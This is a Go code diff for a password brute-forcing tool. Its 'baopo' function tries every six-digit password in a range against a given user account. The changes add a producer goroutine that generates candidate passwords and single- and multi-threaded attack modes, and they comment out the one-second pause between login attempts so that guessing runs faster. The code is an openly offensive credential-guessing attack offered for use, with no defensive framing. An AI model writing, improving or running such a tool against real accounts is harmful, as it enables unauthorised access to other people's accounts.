@@ -124,8 +124,10 @@ func baopo(userid, spwd, epwd string) (pwd string, iss bool, err error) { //暴�
 		return
 	}
 	ism := false
-	cpwd := fmt.Sprintf("%06s", spwd)
-	for f, _ := less(cpwd, epwd); f && !isfindpwd; cpwd, _ = addpwd(cpwd) {
+	pch := make(chan string, 10)
+	go producepwd(spwd, epwd, pch)
+	cpwd := getnextpwd(pch)
+	for f, _ := less(cpwd, epwd); f && !isfindpwd; cpwd = getnextpwd(pch) {
 		fmt.Println("正在测试", userid, "-", cpwd)
 		ism, err = ismatch(userid, cpwd)
 		if err != nil {
@@ -139,7 +141,8 @@ func baopo(userid, spwd, epwd string) (pwd string, iss bool, err error) { //暴�
 			isfindpwd = true
 			return
 		}
-		time.Sleep(1000 * time.Millisecond)
+		f, _ = less(cpwd, epwd)
+		//time.Sleep(1000 * time.Millisecond)
 	}
 	return
 }
@@ -179,8 +182,8 @@ func splitpwd(spwd, epwd string, num int) (plist []string, err error) { //将密
 	plist[num] = epwd
 	return
 }
-func main() {
-	id, spwd, epwd := "", "", ""
+
+func inputidpwd() (id, spwd, epwd string) {
 LABEL_IPTID:
 	fmt.Println("输入账号")
 	fmt.Scanf("%s\n", &id)
@@ -198,29 +201,62 @@ LABEL_IPTID:
 	if len(epwd) == 0 {
 		epwd = "319999"
 	}
-	fmt.Println(id, spwd, epwd)
-	//ts:=time.Now()
-	//_,_,err:=baopo(id,spwd,epwd)
-	//te:=time.Now()
-	//td:=te.Sub(ts)
-	//fmt.Println("耗时:",td)
-	//if err != nil {
-	//	fmt.Println(err)
-	//}
+	return
+}
 
-	//maxthread:=3
-	//pl,_:=splitpwd(pwd,"319999",maxthread)
-	//for i:=0;i<maxthread;i++{
-	//	ps,pe:=pl[i],pl[i+1]
-	//	//fmt.Println(ps,pe)
-	//	go baopo(id,ps,pe)
-	//}
-	//ts:=time.Now()
-	//for !isfindpwd{
-	//	time.Sleep(1000*time.Millisecond)
-	//}
-	//te:=time.Now()
-	//td:=te.Sub(ts)
-	//fmt.Println("耗时:",td)
-	//fmt.Scanf("%s",&pwd)
+func sglth() { //单线程
+	id, spwd, epwd := inputidpwd()
+	fmt.Println(id, spwd, epwd)
+	ts := time.Now()
+	_, _, err := baopo(id, spwd, epwd)
+	te := time.Now()
+	td := te.Sub(ts)
+	fmt.Println("运行完毕,耗时:", td)
+	if err != nil {
+		fmt.Println(err)
+	}
+}
+
+func mtlth() { //多线程
+	id, spwd, epwd := inputidpwd()
+	maxthread := 3
+	pl, _ := splitpwd(spwd, epwd, maxthread)
+	for i := 0; i < maxthread; i++ {
+		ps, pe := pl[i], pl[i+1]
+		//fmt.Println(ps,pe)
+		go baopo(id, ps, pe)
+	}
+	ts := time.Now()
+	for !isfindpwd {
+		time.Sleep(1000 * time.Millisecond)
+	}
+	te := time.Now()
+	td := te.Sub(ts)
+	fmt.Println("耗时:", td)
+}
+
+func producepwd(spwd, epwd string, ch chan<- string) {
+	f, err := less(spwd, epwd)
+	for cpwd := spwd; f; cpwd, err = addpwd(cpwd) {
+		if err != nil {
+			panic(err)
+		}
+		ch <- fmt.Sprintf("%06s", cpwd)
+		f, err = less(cpwd, epwd)
+		if err != nil {
+			panic(err)
+		}
+	}
+}
+
+func getnextpwd(ch <-chan string) (pwd string) {
+	pwd = <-ch
+	return
+}
+
+func main() {
+	sglth()
+	fmt.Println("按回车键退出")
+	tmp := ""
+	fmt.Scanf("%s\n", &tmp)
 }
